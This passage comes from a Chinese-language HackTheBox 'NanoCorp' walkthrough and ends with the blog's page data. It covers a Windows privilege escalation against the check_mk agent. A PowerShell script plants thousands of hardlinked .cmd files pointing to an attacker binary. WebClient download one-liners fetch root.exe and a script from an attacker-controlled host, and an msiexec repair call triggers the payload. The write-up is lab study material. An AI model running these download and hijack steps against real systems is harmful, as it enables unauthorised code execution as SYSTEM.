C:\\\u003e msiexec /fa C:\\Windows\\Installer\\\u003cspan class=\"hljs-number\"\u003e1e6\u003c/span\u003ef2.msi\nmsiexec /fa C:\\Windows\\Installer\\\u003cspan class=\"hljs-number\"\u003e1e6\u003c/span\u003ef2.msi\n\nPS C:\\\u003e get-process | findstr check\nget-process | findstr check\n    \u003cspan class=\"hljs-number\"\u003e236\u003c/span\u003e      \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e     \u003cspan class=\"hljs-number\"\u003e3588\u003c/span\u003e      \u003cspan class=\"hljs-number\"\u003e13236\u003c/span\u003e              \u003cspan class=\"hljs-number\"\u003e6696\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e check_mk_agent            \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e编写生成临时文件脚本，脚本由 AI 生成\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003e\u0026#x3C;#\n.SYNOPSIS\n    The ultimate script \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e creating thousands of file entries without consuming disk space.\n\n.DESCRIPTION\n    This script uses Hard Links to create thousands of file pointers to a single source file.\n    This method is extremely fast and consumes virtually no extra disk space, solving the\n    critical issue of disk bloat from file copying.\n\n    It runs in an infinite loop to ensure the files persist, includes a sleep interval to\n    prevent \u003cspan class=\"hljs-number\"\u003e100\u003c/span\u003e% CPU usage, and is built \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e maximum performance and robustness.\n#\u003e\n\n[CmdletBinding()]\nparam()\n\n# --- Configuration ---\n$sourceFile   = \u003cspan class=\"hljs-string\"\u003e\"C:\\tools\\root.exe\"\u003c/span\u003e\n$targetFolder = \u003cspan class=\"hljs-string\"\u003e\"C:\\Windows\\Temp\"\u003c/span\u003e\n$startRange   = \u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e\n$endRange     = \u003cspan class=\"hljs-number\"\u003e15000\u003c/span\u003e\n$sleepSeconds = \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e  # Interval in seconds between each full check.\n# --- End of Configuration ---\n\n# --- Initial Cleanup ---\nWrite-Host \u003cspan class=\"hljs-string\"\u003e\"Performing initial cleanup of target files...\"\u003c/span\u003e\ntry {\n    Get-ChildItem -Path \u003cspan class=\"hljs-string\"\u003e\"$targetFolder\\cmk_all_*.cmd\"\u003c/span\u003e | Remove-Item -Force\n}\ncatch {\n    Write-Warning \u003cspan class=\"hljs-string\"\u003e\"Could not perform initial cleanup. Error: $($_.Exception.Message)\"\u003c/span\u003e\n}\n\n# --- Main Infinite Loop ---\n\u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e ($\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e) {\n    Write-Host \u003cspan class=\"hljs-string\"\u003e\"Starting new Hard Link creation cycle at $(Get-Date)\"\u003c/span\u003e\n\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (-not (Test-Path -Path $sourceFile -PathType Leaf)) {\n        Write-Error \u003cspan class=\"hljs-string\"\u003e\"CRITICAL: Source file '$sourceFile' not found. Sleeping for 60 seconds before retrying...\"\u003c/span\u003e\n        Start-Sleep -Seconds \u003cspan class=\"hljs-number\"\u003e60\u003c/span\u003e\n        \u003cspan class=\"hljs-keyword\"\u003econtinue\u003c/span\u003e \n    }\n\n    # --- High-Performance Hard Link Creation Loop ---\n    \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e ($i = $startRange; $i -le $endRange; $i++) {\n        $linkName = \u003cspan class=\"hljs-string\"\u003e\"$targetFolder\\cmk_all_${i}_1.cmd\"\u003c/span\u003e\n        \n        # If the link/file already exists, skip to the next one to save time.\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (Test-Path -LiteralPath $linkName) {\n            \u003cspan class=\"hljs-keyword\"\u003econtinue\u003c/span\u003e\n        }\n        \n        try {\n            # Use the native \u003cspan class=\"hljs-string\"\u003e'fsutil'\u003c/span\u003e command to create a hard link.\n            # This is the fastest and most space-efficient method.\n            # We use \u003cspan class=\"hljs-string\"\u003e'cmd /c'\u003c/span\u003e to properly execute fsutil and handle output.\n            cmd /c fsutil hardlink create $linkName $sourceFile | Out-Null\n        }\n        catch {\n            Write-Warning \u003cspan class=\"hljs-string\"\u003e\"Failed to create hard link for number $i. Error: $($_.Exception.Message)\"\u003c/span\u003e\n        }\n    }\n    \n    # IMPORTANT NOTE about Read-Only property on Hard Links:\n    # All hard links point to the SAME file data and metadata.\n    # If you \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e one link to read-only, the original file and ALL other links\n    # ALSO become read-only.\n    # We \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e it once on the source file, and all links will inherit it.\n    try {\n        (Get-Item -LiteralPath $sourceFile).IsReadOnly = $\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n    }\n    catch {\n        Write-Warning \u003cspan class=\"hljs-string\"\u003e\"Could not set read-only attribute on source file. Error: $($_.Exception.Message)\"\u003c/span\u003e\n    }\n\n    Write-Host \u003cspan class=\"hljs-string\"\u003e\"Cycle finished. Sleeping for $sleepSeconds seconds...\"\u003c/span\u003e\n    Start-Sleep -Seconds $sleepSeconds\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e准备好后开始利用\u003c/p\u003e\n\u003cp\u003e来到 web_svc 的 \u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003e$p=new-object system.net.webclient;$p.downloadfile(\u003cspan class=\"hljs-string\"\u003e'http://\u0026#x3C;your-ip\u003e/root.exe'\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e'C:\\tools\\root.exe'\u003c/span\u003e)\n$p=new-object system.net.webclient;$p.downloadfile(\u003cspan class=\"hljs-string\"\u003e'http://\u0026#x3C;your-ip\u003e/sunset.ps1'\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e'C:\\tools\\sunset.ps1'\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e首先运行 \u003ccode\u003esunset.ps1\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003eC:\\tools\\sunset.ps1\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e执行完毕后再通过 \u003ccode\u003emsiexec\u003c/code\u003e 调用 \u003ccode\u003e1e6f2.msi\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003emsiexec /fa C:\\Windows\\Installer\\\u003cspan class=\"hljs-number\"\u003e1e6\u003c/span\u003ef2.msi\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e最后应该就能看到文件了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20NanoCorp/image14.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e一开始漏洞有点难找，相关的玩意有点多。\u003c/p\u003e\n\u003cp\u003e最后的利用点也是，很难看到存在一个没扫描到的端口，并且还是利用点。\u003c/p\u003e","title":"HackTheBox - Season9 - NanoCorp","date":"2025-11-14","updated":"2025-11-14","tags":["HackTheBox","Windows","CVE-2025-24071","CVE-2024-0670","encrypt"],"categories":"靶机","comments":true,"description":"Season9 NanoCorp https://app.hackthebox.com/machines/NanoCorp Recon PortScan 枚举 80 端口 目录扫描 主站是看着没有什么的，尝试一下爆一下子域名 换个字典，爆破到存在 hire 子域名 CVE 2025 24071 将...","isEncrypted":true},"recentPosts":[{"id":"HackMyVMSkid","title":"HackMyVM - Skid","date":"2025-12-03","isEncrypted":false,"year":"2025","month":"12","day":"03"},{"id":"群U靶机SudoHome_sunset","title":"群U靶机 - SudoHome","date":"2025-11-23","isEncrypted":false,"year":"2025","month":"11","day":"24"},{"id":"群U靶机Yibasuo","title":"群U靶机 - Yibasuo","date":"2025-11-22","isEncrypted":false,"year":"2025","month":"11","day":"24"},{"id":"HackMyVMHunter","title":"HackMyVM - Hunter","date":"2025-11-21","isEncrypted":false,"year":"2025","month":"11","day":"21"},{"id":"HackTheBoxSeason9 - NanoCorp","title":"HackTheBox - Season9 - NanoCorp","date":"2025-11-14","isEncrypted":true,"year":"2025","month":"11","day":"14"},{"id":"HackTheBoxSeason8 - Voleur","title":"HackTheBox - Machine - Voleur","date":"2025-07-07","isEncrypted":false,"year":"2025","month":"11","day":"12"},{"id":"HackTheBoxSeason8 - RustyKey","title":"HackTheBox - Machine - RustyKey","date":"2025-06-30","isEncrypted":false,"year":"2025","month":"11","day":"12"}]},"__N_SSG":true},"page":"/[year]/[month]/[day]/[id]","query":{"year":"2025","month":"11","day":"14","id":"HackTheBoxSeason9 - NanoCorp"},"buildId":"fZfIvGZ7IygHEm6klVvEz","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>